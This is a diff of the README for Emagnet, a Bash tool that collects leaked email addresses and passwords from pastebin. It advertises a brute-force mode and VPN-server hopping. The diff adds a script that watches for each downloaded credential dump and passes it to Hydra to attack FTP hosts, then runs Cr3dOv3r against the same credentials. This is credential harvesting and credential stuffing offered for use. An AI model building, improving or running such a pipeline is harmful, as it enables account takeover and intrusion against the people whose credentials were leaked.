@@ -1,22 +1,59 @@
-![Screenshot](https://nr1.nu/emagnet/pictures/emagnet-maskot.png)
+![Screenshot](https://nr1.nu/emagnet/previews/emagnet_oldmovi.gif)
 
-## _"I'll will find you, it's just a matter of time"_
+## <p align="center"> _"I'll will find you, it's just a matter of time"_
+<p align="center">
 
+  <a href="https://github.com/wuseman/EMAGNET">
+<img src="https://img.shields.io/github/languages/top/wuseman/emagnet.svg?color=magenta&label=Bash%2FShell">
+  <a href="https://github.com/wuseman/EMAGNET/issues?q=is%3Aissue+is%3Aclosed">
+    <img src="https://img.shields.io/github/issues-closed/wuseman/emagnet.svg?color=light&label=Closed%20Issues">
+  
+  <a href="https://github.com/wuseman/EMAGNET/issues">
+    <img src="https://img.shields.io/github/issues-raw/wuseman/emagnet.svg?color=orange&label=Open%20Issues">
+  
+  
+  
+  <img src="https://img.shields.io/github/last-commit/wuseman/emagnet.svg?color=darkmagenta&label=Latest%20Commit">
+  <a href="https://twitter.com/wuseman1">
+  
+
+ <img src="https://img.shields.io/website/https/nr1.nu.svg?down_color=darkred&down_message=DOWN&label=Nr1.nu%2Femagnet&up_message=UP">
+  
+
+  <a href="">
+    <img src="https://img.shields.io/github/license/wuseman/emagnet.svg?color=blue&label=License">
+  <a href="">
+    <img src="">
+
+</p>
 
 | Version            |  Released      | Status                            | Tested On                          |
 | :----------------- | :------------- | :-------------------------------- | :----------------------------------|
-| `2.1`              |  2019-05-17    | Under active development          | Linux - Windows - MacOS - Android  |
+| `3.0`              |  2019-06-19    | Under Active Development          | Linux - Windows - MacOS - Android  |
+| `2.1`              |  2019-05-17    | Stable                            | Linux - Windows - MacOS - Android  |
 
-Emagnet is a very powerful tool for it's purpose wich is to capture email addresses and passwords from leaked databases uploaded on pastebin. It's almost impossible to find leaked passwords when they are out of list on pastebin.com. Either they have been deleted by pastebin's techs or the uploads is just one in the crowd. To be honest it's easier to find a needle in a haystack then find outdated uploads on pastebin with the data we want to collect. Brute force mode has been added in version 2.0. See emagnet in action [here](https://nr1.nu/emagnet/pictures/ezgif-4-a9aa514e4dc4.gif)
+Emagnet is a very powerful tool for it's purpose wich is to capture email addresses and passwords from leaked databases uploaded on pastebin. It's almost impossible to find leaked passwords when they are out of list on pastebin.com. Either they have been deleted by pastebin's techs or the uploads is just one in the crowd. To be honest it's easier to find a needle in a haystack then find outdated uploads on pastebin with the data we want to collect. Brute force mode has been added in version 2.0. See emagnet in action [here](https://nr1.nu/emagnet/previews/emagnet_infous.gif)
 
-### Emagnet in action
+### Emagnet v3.0 - Support for jumping between VPN servers
 
-![Screenshot](https://nr1.nu/emagnet/pictures/ezgif-4-a9aa514e4dc4.gif.1)
+![Screenshot](https://nr1.nu/emagnet/previews/ezgif-2-c2de16f47d3c.gif)
 
 ### Emagnet with a simple script running beside emagnet: 
 #### Tools used: inotifywait + Cr3dOv3r + emagnet
 
 ![Screenshot](https://nr1.nu/f/emagnet-third-party.gif)
+
+### Script for using Hydra when emagnet is running:
+
+       #!/bin/bash
+       
+       inotifywait -q -m -r -e create --format '%w%f' "/path/to/monitor" | while read FILES; do
+       # Run-your-favorit-tool-here--read-files-by-$(cat $FILES)
+       # Just an example usage for Hydra that can be used when you download uploads from pastebin: 
+       hydra -C $FILES ftp://$(grep-a-ip-or-hostname-for-example)”    
+       # For use my example in the video: (for hit enter when cr3d0v3r asking for password read: "manual yes") 
+       cd /path/to/Cr3dOv3r;python -q emailaddress.com 
+       done
 
 ### Get Started On Linux/MacOSX
  
@@ -113,3 +150,4 @@ _wuseman cannot be held as responsible for users actions regardless of what dama
 ####
 #### Emagnet development has just started and is FAR away from complete, to be continued. 
 ####
+
